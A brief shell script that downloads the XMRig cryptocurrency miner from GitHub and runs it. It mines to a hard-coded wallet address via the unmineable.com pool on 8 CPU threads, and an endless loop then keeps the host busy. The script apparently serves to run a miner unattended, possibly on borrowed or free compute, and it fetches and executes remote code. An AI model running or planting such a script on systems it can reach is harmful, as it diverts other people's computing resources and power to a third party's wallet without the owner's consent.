#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
./xmrig -o ethash.unmineable.com:3333 -a rx -k -u XMR:41zE1Lu19wNWDe5JJauHP59FjxEXTqaW6Bf2ojwsZLamHvDVaNwU4Q8HPVWL6d2UWiW1cs8pcTP6SX6jAv9NEUjEJTh1BXc.God_Miner#ek61-6h9x -p x --cpu 8
while [ 1 ]; do
sleep 3
done
sleep 999
